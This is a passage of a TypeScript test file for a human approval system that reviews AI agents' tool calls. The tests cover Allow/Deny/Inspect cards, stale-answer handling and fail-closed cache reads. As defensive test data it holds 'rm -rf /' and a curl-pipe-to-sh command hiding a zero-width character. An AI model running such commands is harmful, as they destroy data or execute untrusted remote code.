// SPDX-License-Identifier: LicenseRef-Archestra-Enterprise
import { sql } from "drizzle-orm";
import type { KeyvStoreAdapter } from "keyv";
import { describe, expect, test, vi } from "vitest";
import { type AllowedCacheKey, cacheManager } from "@/cache-manager";
import db from "@/database";
import { setupTestCacheManager } from "@/test/cache-manager";
import { makeReturnLabelReview } from "@/test/openappa-return-label-review";
import {
  consumeHitlRuling,
  getHitlAskUserArguments,
  getHitlInspectableAskUserArguments,
  getHitlReview,
  peekHitlRuling,
  resolveHitlInspectableAnswer,
  sealHitlClosure,
  stageHitlReview,
} from "./hitl-review";
import {
  type HitlReviewCard,
  hitlInspectionDigest,
  hitlReviewCard,
  hitlReviewCardAnswer,
  previousHitlCardAnswer,
  renderHitlReviewText,
} from "./hitl-review-overview";
import type { OpenAppaSession } from "./service";

vi.mock("@/logging");
vi.mock("ai", async (importOriginal) => ({
  ...(await importOriginal<typeof import("ai")>()),
  generateText: vi
    .fn()
    .mockRejectedValue(new Error("summary service unavailable")),
}));

// The real cache, stored in this file's test database.
setupTestCacheManager();

const session = (sessionId: string): OpenAppaSession => ({
  organization_id: "organization",
  caller_id: "user:user",
  session_id: sessionId,
});

const COVERAGE = [
  "[OpenAPPA] Approve this call?",
  'APPA asks you to rule as the authority "hitl".',
  "",
  "What this ruling would cover:",
  "  - the readers must be the public audience",
  "",
].join("\n");

function longReview(offerId: string, command?: string) {
  const cmd = command ?? `echo ${"exact-payload ".repeat(400)}`;
  return {
    offerId,
    text: COVERAGE,
    tool: "Bash",
    arguments: JSON.stringify({ command: cmd, cmd }),
    remedyArguments: { offer_id: offerId, plan: "Submit for approval" },
  };
}

function smallReview(offerId: string) {
  return {
    offerId,
    text: COVERAGE,
    tool: "Bash",
    arguments: JSON.stringify({ command: "ls -la", cmd: "ls -la" }),
    remedyArguments: { offer_id: offerId, plan: "Submit for approval" },
  };
}

describe("return-label reviews", () => {
  test("a repeated return declaration cannot replace the parameters on an open review", async () => {
    const offerId = "return-label-changed";
    const reviewSession = session("return-label-changed");
    const review = makeReturnLabelReview(offerId);
    await stageHitlReview({ session: reviewSession, review });
    const issued = await getHitlInspectableAskUserArguments({
      session: reviewSession,
      offerIds: [offerId],
    });
    if (!issued) throw new Error("expected a return-label review card");
    await stageHitlReview({
      session: reviewSession,
      review: {
        ...review,
        remedyArguments: {
          offer_id: offerId,
          label: { audience: ["internal"] },
        },
      },
    });
    expect(
      (await getHitlReview({ session: reviewSession, offerId }))
        ?.remedyArguments,
    ).toEqual(review.remedyArguments);
    expect(
      await resolveHitlInspectableAnswer({
        session: reviewSession,
        offerId,
        answer: "approve",
        carriedReviewText: false,
        claimDigest: issued.digest,
      }),
    ).toEqual({ status: "recorded", ruling: "approve" });
  });

  test.each([
    "approve",
    "deny",
    "inspect",
  ] as const)("a long runtime launch supports %s without treating its arguments as policy scope", async (answer) => {
    const offerId = `return-label-${answer}`;
    const reviewSession = session(`return-label-${answer}`);
    const review = makeReturnLabelReview(offerId);
    await stageHitlReview({ session: reviewSession, review });
    const plain = await getHitlAskUserArguments({
      session: reviewSession,
      offerIds: [offerId],
    });
    expect(plain?.options.map((option) => option.label)).toEqual([
      "Approve",
      "Deny",
    ]);
    expect(plain?.question).toContain(JSON.parse(review.arguments).message);
    const issued = await getHitlInspectableAskUserArguments({
      session: reviewSession,
      offerIds: [offerId],
    });
    expect(issued?.card.options.map((option) => option.label)).toEqual([
      "Allow",
      "Deny",
      "Inspect",
    ]);
    expect(issued?.card.callPreview).toContain("4,080 characters");
    const label =
      answer === "approve" ? "Allow" : answer === "deny" ? "Deny" : "Inspect";
    expect(hitlReviewCardAnswer(label)).toBe(answer);
    if (!issued) throw new Error("expected a return-label review card");
    const result = await resolveHitlInspectableAnswer({
      session: reviewSession,
      offerId,
      answer,
      carriedReviewText: false,
      claimDigest: issued.digest,
    });
    if (answer !== "inspect") {
      expect(result).toEqual({ status: "recorded", ruling: answer });
      expect(await consumeHitlRuling({ session: reviewSession, offerId })).toBe(
        answer,
      );
      return;
    }
    expect(result).toEqual({ status: "inspect-pending" });
    expect(
      await peekHitlRuling({ session: reviewSession, offerId }),
    ).toBeUndefined();
    const inspected = await getHitlInspectableAskUserArguments({
      session: reviewSession,
      offerIds: [offerId],
    });
    expect(inspected?.reviewText).toContain(
      JSON.parse(review.arguments).message,
    );
    expect(inspected?.reviewText).toContain("attention: human-approval");
    expect(inspected?.digest).toBe(issued.digest);
    expect(
      await resolveHitlInspectableAnswer({
        session: reviewSession,
        offerId,
        answer: "approve",
        carriedReviewText: true,
        claimDigest: issued.digest,
      }),
    ).toEqual({ status: "recorded", ruling: "approve" });
  });

  test("an unsupported trailing condition stays unapprovable even after Inspect", async () => {
    const offerId = "return-label-unsupported";
    const reviewSession = session("return-label-unsupported");
    const review = makeReturnLabelReview(offerId);
    review.text +=
      "\nAdditional condition: the declared return must remain inside its audience.";
    await stageHitlReview({ session: reviewSession, review });
    const issued = await getHitlInspectableAskUserArguments({
      session: reviewSession,
      offerIds: [offerId],
    });
    if (!issued) throw new Error("expected a return-label review card");
    expect(issued.card.options.map((option) => option.label)).toEqual([
      "Deny",
      "Inspect",
    ]);
    await resolveHitlInspectableAnswer({
      session: reviewSession,
      offerId,
      answer: "inspect",
      carriedReviewText: false,
      claimDigest: issued.digest,
    });
    const inspected = await getHitlInspectableAskUserArguments({
      session: reviewSession,
      offerIds: [offerId],
    });
    expect(inspected?.reviewText).toContain("Additional condition:");
    expect(inspected?.card.options.map((option) => option.label)).toEqual([
      "Deny",
      "Inspect",
    ]);
    expect(
      await resolveHitlInspectableAnswer({
        session: reviewSession,
        offerId,
        answer: "approve",
        carriedReviewText: true,
        claimDigest: issued.digest,
      }),
    ).toEqual({ status: "stale" });
    expect(
      await peekHitlRuling({ session: reviewSession, offerId }),
    ).toBeUndefined();
    expect(
      await resolveHitlInspectableAnswer({
        session: reviewSession,
        offerId,
        answer: "deny",
        carriedReviewText: true,
        claimDigest: issued.digest,
      }),
    ).toEqual({ status: "recorded", ruling: "deny" });
  });
});

describe("hitlReviewCard", () => {
  const base: HitlReviewCard = {
    question: "Approve the Bash command?\n\nThe whole call.",
    header: "Approval",
    options: [],
    allowMultiple: false,
    remedy_offer_ids: ["offer"],
  };
  const cardFor = (review: {
    tool?: string;
    arguments?: string;
    text: string;
    summary?: string;
  }) => hitlReviewCard({ base, review });
  const previewOf = (card: HitlReviewCard, label: string) =>
    card.options.find((option) => option.label === label)?.preview ?? "";
  const fitsThePane = (preview: string) =>
    preview.length <= 2000 &&
    preview.split("\n").every((line) => [...line].length <= 34);

  test("asks one line and shows the exact arguments, with the scope under Allow only", () => {
    const { card, approve } = cardFor({
      tool: "mcp/archestra_pm/create_goal",
      arguments: JSON.stringify({
        list: "sprint",
        name: "Perf: Staging at scale",
        targetDate: "2026-10-19",
        assigneeSlackIds: ["U0BAZ9KK6JY"],
      }),
      text: COVERAGE,
    });
    expect(approve).toBe(true);
    expect(card.shortQuestion).toBe("Run archestra_pm__create_goal?");
    expect(card.header).toBe("Tool call");
    expect(
      card.options.map((option) => [option.label, option.description]),
    ).toEqual([
      ["Allow", "This exact call."],
      ["Deny", "Keep it blocked."],
      ["Inspect", "Show the full review in chat."],
    ]);
    const values = [
      "list: sprint",
      "name: Perf: Staging at scale",
      "targetDate: 2026-10-19",
      "assigneeSlackIds:",
      "  - U0BAZ9KK6JY",
    ].join("\n");
    expect(previewOf(card, "Allow")).toBe(
      `${values}\n\nAlso accepts:\n  the readers must be the public\n    audience`,
    );
    expect(previewOf(card, "Deny")).toBe(values);
    expect(previewOf(card, "Inspect")).toBe(values);
    expect(card.callPreview).toBe(values);
    // A client that withholds previews shows the plain card's full question.
    expect(card.question).toBe(base.question);
  });

  test("keeps every line inside the pane and leaves wrapped diff lines unsigned", () => {
    const { card } = cardFor({
      tool: "Edit",
      arguments: JSON.stringify({
        file_path: "/home/user/project/src/openappa/hitl-review.ts",
        old_string:
          '    { label: "Approve", description: "Allow this exact tool call." },',
        new_string:
          '    { label: "Allow", description: "Run this exact call." },',
      }),
      text: COVERAGE,
    });
    const preview = previewOf(card, "Deny");
    expect(fitsThePane(preview)).toBe(true);
    const lines = preview.split("\n");
    // One removed and one added line; their continuations carry no sign.
    expect(lines.filter((line) => line.startsWith("-"))).toEqual([
      '-    { label: "Approve",',
    ]);
    expect(lines.filter((line) => line.startsWith("+"))).toEqual([
      '+    { label: "Allow",',
    ]);
    expect(preview).toContain("exact tool call.");
  });

  test("counts a combining mark as no column and keeps it on its letter's line", () => {
    // A decomposed "é", as macOS writes file names: a letter and U+0301.
    const accented = "e\u0301";
    const previewFor = (count: number) =>
      previewOf(
        cardFor({
          tool: "Bash",
          arguments: JSON.stringify({ name: accented.repeat(count) }),
          text: COVERAGE,
        }).card,
        "Deny",
      );
    // "name: " and 28 letters take the pane's 34 columns.
    expect(previewFor(28)).toBe(`name: ${accented.repeat(28)}`);
    const lines = previewFor(40).split("\n");
    expect(lines.length).toBeGreaterThan(1);
    for (const line of lines) {
      expect(line.trimStart().startsWith("\u0301")).toBe(false);
      expect(line.replaceAll("\u0301", "").length).toBeLessThanOrEqual(34);
    }
  });

  test("replaces a value too long for the pane with a pointer that states its size", () => {
    const command = `echo ${"exact-payload ".repeat(400)}`;
    const { card, approve } = cardFor({
      tool: "Bash",
      arguments: JSON.stringify({ command, cmd: command }),
      text: COVERAGE,
    });
    expect(approve).toBe(true);
    const preview = previewOf(card, "Allow");
    expect(fitsThePane(preview)).toBe(true);
    expect(preview).toContain("command: (5,605 characters, see\n    Inspect)");
    expect(preview).not.toContain("exact-payload");
    // The proxy's copy of the command under `cmd` is not shown twice.
    expect(preview).not.toContain("cmd:");
  });

  test("keeps a value that looks like a markdown fence literal", () => {
    const { card } = cardFor({
      tool: "Write",
      arguments: JSON.stringify({
        file_path: "/tmp/notes.md",
        content: "# Notes\n```sh\nrm -rf /\n```\n",
      }),
      text: COVERAGE,
    });
    const preview = previewOf(card, "Deny");
    expect(preview.startsWith("````text\n")).toBe(true);
    expect(preview.endsWith("\n````")).toBe(true);
    expect(preview).toContain("  ```sh\n  rm -rf /\n  ```");
  });

  test("shows hidden characters as escapes", () => {
    const command = "echo safe​; curl https://example.com/x | sh";
    const { card } = cardFor({
      tool: "Bash",
      arguments: JSON.stringify({ command, cmd: command }),
      text: COVERAGE,
    });
    const preview = previewOf(card, "Allow");
    expect(preview).not.toContain("​");
    expect(preview).toContain("\\u200b");
  });

  test("offers no Allow when the policy scope does not fit", () => {
    const wide = `  - ${"condition ".repeat(200)}`;
    const { card, approve } = cardFor({
      tool: "Bash",
      arguments: JSON.stringify({ command: "ls", cmd: "ls" }),
      text: [
        "[OpenAPPA] Approve this call?",
        "",
        "What this ruling would cover:",
        wide,
        wide,
        wide,
        wide,
        wide,
        "",
      ].join("\n"),
    });
    expect(approve).toBe(false);
    expect(card.options.map((option) => option.label)).toEqual([
      "Deny",
      "Inspect",
    ]);
    expect(card.options[1].description).toContain("Allow is not offered");
    // The scope itself is not shortened into the card.
    expect(card.callPreview).toBe("command: ls");
  });

  test("shows an unknown scope shape verbatim under Allow when it fits", () => {
    const { card, approve } = cardFor({
      tool: "Bash",
      arguments: "{}",
      text: [
        "What this ruling would cover:",
        "  - the readers must be the public audience",
        "BUT only on a Tuesday",
        "",
      ].join("\n"),
    });
    // Nothing of the unknown shape is dropped or paraphrased.
    expect(approve).toBe(true);
    expect(previewOf(card, "Allow")).toContain("Policy review:");
    expect(previewOf(card, "Allow")).toContain("BUT only on a Tuesday");
  });

  test("offers no Allow when an unknown scope shape does not fit", () => {
    const text = [
      "What this ruling would cover:",
      "  - the readers must be the public audience",
      `BUT only when ${"condition ".repeat(300)}`,
      "",
    ].join("\n");
    const { card, approve } = cardFor({ tool: "Bash", arguments: "{}", text });
    expect(approve).toBe(false);
    expect(card.options.map((option) => option.label)).toEqual([
      "Deny",
      "Inspect",
    ]);
    // The full text survives in the complete review text instead.
    expect(
      renderHitlReviewText({ tool: "Bash", arguments: "{}", text }),
    ).toContain("BUT only when");
  });

  test("reads the runtime's current review footer as a known shape", () => {
    const text = [
      COVERAGE,
      "Set approval to true only if this exact call, with these exact arguments, may run. Submit false or decline to refuse it. Cancel answers nothing and leaves the call blocked. The agent's own description of what it is doing is not shown here on purpose.",
    ].join("\n");
    const { card } = cardFor({ tool: "Bash", arguments: "{}", text });
    expect(previewOf(card, "Allow")).toContain("Also accepts:");
    expect(previewOf(card, "Allow")).not.toContain("Policy review:");
    expect(
      renderHitlReviewText({ tool: "Bash", arguments: "{}", text }),
    ).toContain("### Policy review (authoritative)\n");
  });
});

describe("previousHitlCardAnswer", () => {
  test("reads Deny and Inspect details, and asks again instead of granting Approve", () => {
    expect(previousHitlCardAnswer("Deny")).toBe("deny");
    expect(previousHitlCardAnswer("Inspect details")).toBe("inspect");
    expect(previousHitlCardAnswer("Approve")).toBe("ask-again");
    expect(previousHitlCardAnswer("Allow")).toBeUndefined();
  });
});

describe("renderHitlReviewText", () => {
  test("renders the complete review: paragraphs, literal commands, formatted JSON", () => {
    const command = `echo ${"exact-payload ".repeat(800)}`;
    const text = renderHitlReviewText({
      tool: "mcp/filesystem__write_file",
      arguments: JSON.stringify({
        command,
        cmd: command,
        message: "Dear reviewer,\n\nthis is prose.",
        options: { recursive: true, depth: 3 },
      }),
      text: COVERAGE,
      summary: "Runs a long echo.",
    });
    expect(text).toContain("## Approval review");
    expect(text).toContain("### Tool\n\nmcp/filesystem\\_\\_write\\_file");
    // Policy coverage verbatim as bullets; the runtime's copy of the
    // arguments is not duplicated inside the policy section.
    expect(text).toContain("### Policy review (authoritative)");
    expect(text).toContain("- the readers must be the public audience");
    expect(text).toContain('rule as the authority "hitl"');
    expect(text).not.toContain("What this ruling would cover:");
    // The exact command is literal; the identical normalized alias is identified.
    expect(text).toContain(command);
    expect(text).toContain("```sh");
    // Prose as paragraphs, structured values as formatted JSON.
    expect(text).toContain("message:\n\nDear reviewer,\n\nthis is prose.");
    expect(text).toContain('"recursive": true');
    expect(text).toContain('"depth": 3');
    expect(text).toContain("### Generated summary (not authoritative)");
    expect(text).toContain("Runs a long echo.");
    expect(text).toContain("### Reading this review");
  });

  test("escapes invisible control characters without touching genuine backslashes", () => {
    const tricky = "path C:\\Temp\\note.txt has \u001b[31m color";
    const text = renderHitlReviewText({
      tool: "Bash",
      arguments: JSON.stringify({ command: tricky, cmd: tricky }),
      text: COVERAGE,
    });
    // The terminal escape is neutralized into a visible JSON escape, and the
    // genuine backslashes stay, doubled exactly as JSON encodes them.
    expect(text).not.toContain("\u001b");
    expect(text).toContain("C:\\\\Temp\\\\note.txt");
    expect(text).toContain("\\u001b");
    expect(text).toContain("escaped");
  });

  test("shows unparsed arguments verbatim", () => {
    const text = renderHitlReviewText({
      tool: "Bash",
      arguments: "{not json",
      text: COVERAGE,
    });
    expect(text).toContain("not valid JSON");
    expect(text).toContain("{not json");
  });
});

async function issuedDigest(
  reviewSession: OpenAppaSession,
  offerId: string,
): Promise<string> {
  const issued = await getHitlInspectableAskUserArguments({
    session: reviewSession,
    offerIds: [offerId],
    emit: false,
  });
  if (!issued) throw new Error("expected an inspectable card");
  return issued.digest;
}

describe("inspection state", () => {
  test("the card emits no text until a signed Inspect answer", async () => {
    const offerId = "offer-inspect-quiet";
    const reviewSession = session("user:user|inspect-quiet");
    await stageHitlReview({
      session: reviewSession,
      review: longReview(offerId),
    });
    const first = await getHitlInspectableAskUserArguments({
      session: reviewSession,
      offerIds: [offerId],
    });
    expect(first?.reviewText).toBeUndefined();
    expect(first?.card.options.map((option) => option.label)).toEqual([
      "Allow",
      "Deny",
      "Inspect",
    ]);
    // The long command gives way to a pointer; the scope still shows.
    const allow = first?.card.options[0]?.preview ?? "";
    expect(allow.length).toBeLessThanOrEqual(2000);
    expect(allow).toContain("see\n    Inspect)");
    expect(allow).toContain("Also accepts:");
  });

  test("inspect pendings the review and the next issue carries the complete text", async () => {
    const offerId = "offer-inspect-emit";
    const reviewSession = session("user:user|inspect-emit");
    const command = `echo ${"exact-payload ".repeat(400)}`;
    await stageHitlReview({
      session: reviewSession,
      review: longReview(offerId, command),
    });
    const digest = await issuedDigest(reviewSession, offerId);
    const asked = await resolveHitlInspectableAnswer({
      session: reviewSession,
      offerId,
      answer: "inspect",
      carriedReviewText: false,
      claimDigest: digest,
    });
    expect(asked).toEqual({ status: "inspect-pending" });
    expect(
      await peekHitlRuling({ session: reviewSession, offerId }),
    ).toBeUndefined();
    const next = await getHitlInspectableAskUserArguments({
      session: reviewSession,
      offerIds: [offerId],
    });
    expect(next?.reviewText).toContain("## Approval review");
    expect(next?.reviewText).toContain(command);
    expect(next?.reviewText).toContain(
      "- the readers must be the public audience",
    );
    // The same card accompanies the text.
    expect(next?.card.options.map((option) => option.label)).toEqual([
      "Allow",
      "Deny",
      "Inspect",
    ]);
  });

  test("an answer to a text-carrying card delivers the inspection; later asks emit no duplicate", async () => {
    const offerId = "offer-inspect-once";
    const reviewSession = session("user:user|inspect-once");
    await stageHitlReview({
      session: reviewSession,
      review: longReview(offerId),
    });
    const digest = await issuedDigest(reviewSession, offerId);
    await resolveHitlInspectableAnswer({
      session: reviewSession,
      offerId,
      answer: "inspect",
      carriedReviewText: false,
      claimDigest: digest,
    });
    const emitted = await getHitlInspectableAskUserArguments({
      session: reviewSession,
      offerIds: [offerId],
    });
    expect(emitted?.reviewText).toBeDefined();
    // Inspecting again from the card that carried the text: delivered, and
    // the text is not emitted twice.
    const again = await resolveHitlInspectableAnswer({
      session: reviewSession,
      offerId,
      answer: "inspect",
      carriedReviewText: true,
      claimDigest: digest,
    });
    expect(again).toEqual({ status: "inspect-shown" });
    const repeated = await getHitlInspectableAskUserArguments({
      session: reviewSession,
      offerIds: [offerId],
    });
    expect(repeated?.reviewText).toBeUndefined();
    expect(repeated?.card.options.map((option) => option.label)).toContain(
      "Inspect",
    );
  });

  test("no approval while a requested inspection is undelivered", async () => {
    const offerId = "offer-inspect-gate";
    const reviewSession = session("user:user|inspect-gate");
    await stageHitlReview({
      session: reviewSession,
      review: longReview(offerId),
    });
    const digest = await issuedDigest(reviewSession, offerId);
    await resolveHitlInspectableAnswer({
      session: reviewSession,
      offerId,
      answer: "inspect",
      carriedReviewText: false,
      claimDigest: digest,
    });
    // An answer from a card issued before the inspection: no grant.
    const early = await resolveHitlInspectableAnswer({
      session: reviewSession,
      offerId,
      answer: "approve",
      carriedReviewText: false,
      claimDigest: digest,
    });
    expect(early).toEqual({ status: "stale" });
    expect(
      await peekHitlRuling({ session: reviewSession, offerId }),
    ).toBeUndefined();
    // The card issued with the text accepts the approval.
    const after = await resolveHitlInspectableAnswer({
      session: reviewSession,
      offerId,
      answer: "approve",
      carriedReviewText: true,
      claimDigest: digest,
    });
    expect(after).toEqual({ status: "recorded", ruling: "approve" });
    await expect(
      consumeHitlRuling({ session: reviewSession, offerId }),
    ).resolves.toBe("approve");
  });

  test("an immediate approval without any inspection is allowed", async () => {
    const offerId = "offer-inspect-immediate";
    const reviewSession = session("user:user|inspect-immediate");
    await stageHitlReview({
      session: reviewSession,
      review: longReview(offerId),
    });
    const approved = await resolveHitlInspectableAnswer({
      session: reviewSession,
      offerId,
      answer: "approve",
      carriedReviewText: false,
      claimDigest: await issuedDigest(reviewSession, offerId),
    });
    expect(approved).toEqual({ status: "recorded", ruling: "approve" });
    await expect(
      consumeHitlRuling({ session: reviewSession, offerId }),
    ).resolves.toBe("approve");
  });

  test("a small review's card shows the whole call and approves immediately", async () => {
    const offerId = "offer-inspect-small";
    const reviewSession = session("user:user|inspect-small");
    await stageHitlReview({
      session: reviewSession,
      review: smallReview(offerId),
    });
    const issued = await getHitlInspectableAskUserArguments({
      session: reviewSession,
      offerIds: [offerId],
    });
    expect(issued?.card.shortQuestion).toBe("Run Bash?");
    expect(issued?.card.callPreview).toBe("command: ls -la");
    expect(issued?.card.options.map((option) => option.label)).toEqual([
      "Allow",
      "Deny",
      "Inspect",
    ]);
    expect(issued?.reviewText).toBeUndefined();
    const approved = await resolveHitlInspectableAnswer({
      session: reviewSession,
      offerId,
      answer: "approve",
      carriedReviewText: false,
      claimDigest: await issuedDigest(reviewSession, offerId),
    });
    expect(approved).toEqual({ status: "recorded", ruling: "approve" });
  });

  test("deny records from any inspection state", async () => {
    const offerId = "offer-inspect-deny";
    const reviewSession = session("user:user|inspect-deny");
    await stageHitlReview({
      session: reviewSession,
      review: longReview(offerId),
    });
    const digest = await issuedDigest(reviewSession, offerId);
    await resolveHitlInspectableAnswer({
      session: reviewSession,
      offerId,
      answer: "inspect",
      carriedReviewText: false,
      claimDigest: digest,
    });
    const denied = await resolveHitlInspectableAnswer({
      session: reviewSession,
      offerId,
      answer: "deny",
      carriedReviewText: false,
      claimDigest: digest,
    });
    expect(denied).toEqual({ status: "recorded", ruling: "deny" });
    await expect(
      consumeHitlRuling({ session: reviewSession, offerId }),
    ).resolves.toBe("deny");
  });

  test("a re-staged review resets the inspection of the old payload", async () => {
    const offerId = "offer-inspect-restage";
    const reviewSession = session("user:user|inspect-restage");
    await stageHitlReview({
      session: reviewSession,
      review: longReview(offerId),
    });
    const oldDigest = await issuedDigest(reviewSession, offerId);
    await resolveHitlInspectableAnswer({
      session: reviewSession,
      offerId,
      answer: "inspect",
      carriedReviewText: false,
      claimDigest: oldDigest,
    });
    // Re-stage with a different payload: the old inspection no longer applies.
    await stageHitlReview({
      session: reviewSession,
      review: longReview(offerId, "echo changed-payload"),
    });
    const issued = await getHitlInspectableAskUserArguments({
      session: reviewSession,
      offerIds: [offerId],
    });
    expect(issued?.reviewText).toBeUndefined();
    // A card of the old payload rules nothing after the re-stage: no
    // approval from it, not even a denial, and its text marker delivers
    // nothing for the new payload.
    const staleApprove = await resolveHitlInspectableAnswer({
      session: reviewSession,
      offerId,
      answer: "approve",
      carriedReviewText: true,
      claimDigest: oldDigest,
    });
    expect(staleApprove).toEqual({ status: "stale" });
    const staleDeny = await resolveHitlInspectableAnswer({
      session: reviewSession,
      offerId,
      answer: "deny",
      carriedReviewText: false,
      claimDigest: oldDigest,
    });
    expect(staleDeny).toEqual({ status: "stale" });
    expect(
      await peekHitlRuling({ session: reviewSession, offerId }),
    ).toBeUndefined();
    // The new payload's own card can still inspect and approve.
    const newDigest = await issuedDigest(reviewSession, offerId);
    await resolveHitlInspectableAnswer({
      session: reviewSession,
      offerId,
      answer: "inspect",
      carriedReviewText: false,
      claimDigest: newDigest,
    });
    const emitted = await getHitlInspectableAskUserArguments({
      session: reviewSession,
      offerIds: [offerId],
    });
    expect(emitted?.reviewText).toContain("echo changed-payload");
    const approved = await resolveHitlInspectableAnswer({
      session: reviewSession,
      offerId,
      answer: "approve",
      carriedReviewText: true,
      claimDigest: newDigest,
    });
    expect(approved).toEqual({ status: "recorded", ruling: "approve" });
  });

  test("an old card's text marker does not deliver a re-staged inspection", async () => {
    const offerId = "offer-inspect-oldmarker";
    const reviewSession = session("user:user|inspect-oldmarker");
    await stageHitlReview({
      session: reviewSession,
      review: longReview(offerId),
    });
    const oldDigest = await issuedDigest(reviewSession, offerId);
    await resolveHitlInspectableAnswer({
      session: reviewSession,
      offerId,
      answer: "inspect",
      carriedReviewText: false,
      claimDigest: oldDigest,
    });
    // The text went out with a card of this payload, then the payload was
    // re-staged and inspected again before any answer came back.
    await stageHitlReview({
      session: reviewSession,
      review: longReview(offerId, "echo changed-payload"),
    });
    const newDigest = await issuedDigest(reviewSession, offerId);
    await resolveHitlInspectableAnswer({
      session: reviewSession,
      offerId,
      answer: "inspect",
      carriedReviewText: false,
      claimDigest: newDigest,
    });
    // The old card's answer arrives now: stale, and the new payload's
    // inspection is still pending — the next issue emits the text.
    const late = await resolveHitlInspectableAnswer({
      session: reviewSession,
      offerId,
      answer: "approve",
      carriedReviewText: true,
      claimDigest: oldDigest,
    });
    expect(late).toEqual({ status: "stale" });
    const emitted = await getHitlInspectableAskUserArguments({
      session: reviewSession,
      offerIds: [offerId],
    });
    expect(emitted?.reviewText).toBeDefined();
    expect(
      await peekHitlRuling({ session: reviewSession, offerId }),
    ).toBeUndefined();
  });

  test("a ruled review offers no inspectable card", async () => {
    const offerId = "offer-inspect-closed";
    const reviewSession = session("user:user|inspect-closed");
    await stageHitlReview({
      session: reviewSession,
      review: longReview(offerId),
    });
    await sealHitlClosure({
      session: reviewSession,
      offerId,
      closure: "cancelled",
    });
    await expect(
      getHitlInspectableAskUserArguments({
        session: reviewSession,
        offerIds: [offerId],
      }),
    ).resolves.toBeUndefined();
    const late = await resolveHitlInspectableAnswer({
      session: reviewSession,
      offerId,
      answer: "approve",
      carriedReviewText: true,
      claimDigest: "irrelevant-after-close",
    });
    expect(late).toEqual({ status: "closed" });
    // The closure stands; nothing was granted.
    await expect(
      consumeHitlRuling({ session: reviewSession, offerId }),
    ).resolves.toBe("none");
  });

  test("inspection state binds to the exact staged payload", async () => {
    const offerId = "offer-inspect-digest";
    const reviewSession = session("user:user|inspect-digest");
    const review = longReview(offerId);
    await stageHitlReview({ session: reviewSession, review });
    await resolveHitlInspectableAnswer({
      session: reviewSession,
      offerId,
      answer: "inspect",
      carriedReviewText: false,
      claimDigest: await issuedDigest(reviewSession, offerId),
    });
    // A restage of the identical payload keeps the pending inspection.
    await stageHitlReview({ session: reviewSession, review });
    const issued = await getHitlInspectableAskUserArguments({
      session: reviewSession,
      offerIds: [offerId],
    });
    expect(issued?.reviewText).toContain("## Approval review");
    expect(hitlInspectionDigest(review)).toBe(
      hitlInspectionDigest({ ...review }),
    );
  });

  test("concurrent inspections of one offer both stay pending and grant nothing", async () => {
    const offerId = "offer-inspect-concurrent";
    const reviewSession = session("user:user|inspect-concurrent");
    await stageHitlReview({
      session: reviewSession,
      review: longReview(offerId),
    });
    const digest = await issuedDigest(reviewSession, offerId);
    const [first, second] = await Promise.all([
      resolveHitlInspectableAnswer({
        session: reviewSession,
        offerId,
        answer: "inspect",
        carriedReviewText: false,
        claimDigest: digest,
      }),
      resolveHitlInspectableAnswer({
        session: reviewSession,
        offerId,
        answer: "inspect",
        carriedReviewText: false,
        claimDigest: digest,
      }),
    ]);
    expect(first).toEqual({ status: "inspect-pending" });
    expect(second).toEqual({ status: "inspect-pending" });
    expect(
      await peekHitlRuling({ session: reviewSession, offerId }),
    ).toBeUndefined();
    // Neither pending inspection lets an approval through without the text.
    const early = await resolveHitlInspectableAnswer({
      session: reviewSession,
      offerId,
      answer: "approve",
      carriedReviewText: false,
      claimDigest: digest,
    });
    expect(early).toEqual({ status: "stale" });
    expect(
      await peekHitlRuling({ session: reviewSession, offerId }),
    ).toBeUndefined();
  });

  test("duplicate emissions of one card share its binding; a replayed answer closes", async () => {
    const offerId = "offer-inspect-duplicate";
    const reviewSession = session("user:user|inspect-duplicate");
    await stageHitlReview({
      session: reviewSession,
      review: longReview(offerId),
    });
    const digest = await issuedDigest(reviewSession, offerId);
    // A second issue of the same payload carries the same binding token.
    const duplicate = await getHitlInspectableAskUserArguments({
      session: reviewSession,
      offerIds: [offerId],
      emit: false,
    });
    expect(duplicate?.digest).toBe(digest);
    const approved = await resolveHitlInspectableAnswer({
      session: reviewSession,
      offerId,
      answer: "approve",
      carriedReviewText: false,
      claimDigest: digest,
    });
    expect(approved).toEqual({ status: "recorded", ruling: "approve" });
    // The duplicate card's identical answer is a replay, not a second ruling.
    const replayed = await resolveHitlInspectableAnswer({
      session: reviewSession,
      offerId,
      answer: "approve",
      carriedReviewText: false,
      claimDigest: digest,
    });
    expect(replayed).toEqual({ status: "closed" });
    // Exactly one approval was recorded and it is spent exactly once.
    await expect(
      consumeHitlRuling({ session: reviewSession, offerId }),
    ).resolves.toBe("approve");
    await expect(
      consumeHitlRuling({ session: reviewSession, offerId }),
    ).resolves.toBeUndefined();
  });
});

type LockedCache = Parameters<Parameters<typeof cacheManager.withLock>[1]>[0];

/** Fails the first read inside the next entered lock once, transiently. */
function failNextLockedRead(): void {
  const lock = cacheManager.withLock.bind(cacheManager);
  let failed = false;
  vi.spyOn(cacheManager, "withLock").mockImplementation(
    <T>(scope: AllowedCacheKey, callback: (cache: LockedCache) => Promise<T>) =>
      lock(scope, async (cache) => {
        const get = cache.get;
        cache.get = async <V>(key: AllowedCacheKey) => {
          if (!failed) {
            failed = true;
            throw new Error("transient cache read failure");
          }
          return get<V>(key);
        };
        return callback(cache);
      }),
  );
}

/**
 * Runs `body` against the real cache whose store fails the first read of an
 * entry matching `failOn`, as a transient storage outage would. Other reads
 * are served by the test database, so the state before and after the fault is
 * real. The real store is restarted by the next test's setup.
 */
async function withFailingStore(
  failOn: (raw: string | undefined) => boolean,
  body: () => Promise<void>,
): Promise<void> {
  cacheManager.shutdown();
  let failed = false;
  const store: KeyvStoreAdapter = {
    opts: {},
    on: () => store,
    async get(key) {
      const result = await db.execute<{ value: string }>(
        sql`SELECT value FROM keyv_cache WHERE key = ${key}`,
      );
      const raw = result.rows[0]?.value;
      if (!failed && failOn(raw)) {
        failed = true;
        throw new Error("transient cache read failure");
      }
      return raw as never;
    },
    async set() {
      throw new Error("transient cache write failure");
    },
    async delete() {
      return false;
    },
    async clear() {},
  };
  cacheManager.start(store);
  try {
    await body();
  } finally {
    cacheManager.shutdown();
  }
}

describe("fail-closed cache reads", () => {
  test("an unreadable stored decision fails staging closed instead of hiding a deny", async () => {
    const offerId = "offer-failclosed-hidden-deny";
    const reviewSession = session("user:user|failclosed-hidden-deny");
    await stageHitlReview({
      session: reviewSession,
      review: longReview(offerId),
    });
    const denied = await resolveHitlInspectableAnswer({
      session: reviewSession,
      offerId,
      answer: "deny",
      carriedReviewText: false,
      claimDigest: await issuedDigest(reviewSession, offerId),
    });
